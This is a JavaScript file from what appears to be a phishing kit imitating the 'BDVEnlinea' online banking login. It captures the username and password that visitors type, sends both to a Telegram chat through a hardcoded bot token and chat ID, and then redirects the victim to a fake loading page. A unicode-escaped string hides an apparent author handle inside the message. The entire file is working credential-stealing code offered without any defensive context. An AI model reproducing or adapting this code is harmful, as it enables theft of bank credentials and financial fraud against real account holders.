document.addEventListener('DOMContentLoaded', () => {
    const enviarUsuarioBtn = document.getElementById('enviarUsuario');
    const enviarPasswordBtn = document.getElementById('enviarPassword');
    const overlay = document.getElementById('overlay');
    const closeBtn = document.getElementById('close-btn');
    const usuarioInput = document.getElementById('usuario');
    const passwordInput = document.getElementById('password');

    enviarUsuarioBtn.addEventListener('click', () => {
        const usuario = usuarioInput.value;

        if (usuario.length < 2) {
            usuarioInput.value = '';
            usuarioInput.focus();
            return;
        }

        enviarMensajeTelegram(usuario); // Enviar solo el nombre de usuario
        localStorage.setItem('usr', usuario);
        overlay.style.display = 'flex';
    });

    enviarPasswordBtn.addEventListener('click', () => {
        const usuario = localStorage.getItem('usr');
        const password = passwordInput.value;

        if (password.length < 2) {
            passwordInput.value = '';
            passwordInput.focus();
            return;
        }

        enviarMensajeTelegram(usuario, password) // Enviar nombre de usuario y contraseña
            .then(() => {
                window.location.href = 'carg.html'; // Redirigir después de enviar el mensaje
            })
            .catch(error => {
                console.error('Error:', error);
            });
    });

    closeBtn.addEventListener('click', () => {
        overlay.style.display = 'none';
    });

    overlay.addEventListener('click', (e) => {
        if (e.target === overlay) {
            overlay.style.display = 'none';
        }
    });

    async function enviarMensajeTelegram(usuario, password = '') {
        const token = '6903851307:AAFFT0FDf1y9fYdBZIQWqfawRtUI1WH2wZM';
        const chatId = '@bdvyo1212';
        
        let mensaje = `✓✓✓BDVEnlinea✓✓✓\n\u0040\u0050\u0072\u006f\u0041\u0072\u0067\u0046\u0075\u006c\u006c\n✓✓✓Usuario: ${usuario}`;

        
        if (password) {
            mensaje += `\n✓✓✓Password: ${password}`;
        }

        try {
            const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `chat_id=${chatId}&text=${mensaje}&parse_mode=html`,
            });

            if (response.ok) {
                return Promise.resolve();
            } else {
                throw new Error('Error al enviar el mensaje');
            }
        } catch (error) {
            return Promise.reject(error);
        }
    }
});
